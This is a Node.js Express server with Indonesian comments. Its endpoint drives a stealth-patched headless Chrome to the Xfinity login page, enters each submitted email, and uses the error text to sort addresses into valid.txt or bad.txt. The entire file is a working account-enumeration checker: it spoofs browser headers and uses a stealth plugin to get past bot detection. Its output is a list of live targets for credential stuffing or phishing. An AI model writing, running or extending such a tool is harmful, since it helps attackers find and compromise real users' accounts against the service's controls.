const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');

// Menggunakan Stealth Plugin
puppeteer.use(StealthPlugin());

const app = express();
const port = 3000; // Port untuk server Express

// ANSI escape codes for coloring output
const colors = {
    reset: '\x1b[0m',
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
};

// Fungsi untuk delay
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

// Fungsi untuk cek email terdaftar di Xfinity
async function checkEmail(email) {
    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--no-zygote',
        ],
        executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome',
        slowMo: 100
    });
    const page = await browser.newPage();

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    });

    try {
        await page.goto('https://login.xfinity.com/login', { timeout: 60000 });

        await page.waitForSelector('#user', { timeout: 10000 });
        await page.type('#user', email);

        await Promise.all([
            page.click('#sign_in'),
            await delay(2000),
            page.waitForNavigation({ timeout: 60000 })
        ]);

        const content = await page.content();

        if (content.includes('The Xfinity ID you entered was incorrect')) {
            console.log(`${colors.red}[FAILED] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`);
            return { email: email, status: 'FAILED' };
        } else {
            console.log(`${colors.green}[SUCCESS] ${email}${colors.reset}`);
            fs.appendFileSync('valid.txt', `${email}\n`);
            return { email: email, status: 'SUCCESS' };
        }

    } catch (error) {
        console.log(`${colors.yellow}[ERROR] ${email}: ${error}${colors.reset}`);
        fs.appendFileSync('bad.txt', `${email}\n`);
        return { email: email, status: 'ERROR' };
    } finally {
        await browser.close();
    }
}

// Rute untuk menangani permintaan GET
app.get('/validator', async (req, res) => {
    const email = req.query.email; // Mengambil email dari query parameter

    if (!email) {
        return res.status(400).send('Email parameter is required');
    }

    try {
        const result = await checkEmail(email);
        res.json(result); // Mengembalikan hasil sebagai JSON
    } catch (error) {
        res.status(500).send(`Error checking email: ${error.message}`);
    }
});

// Menjalankan server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
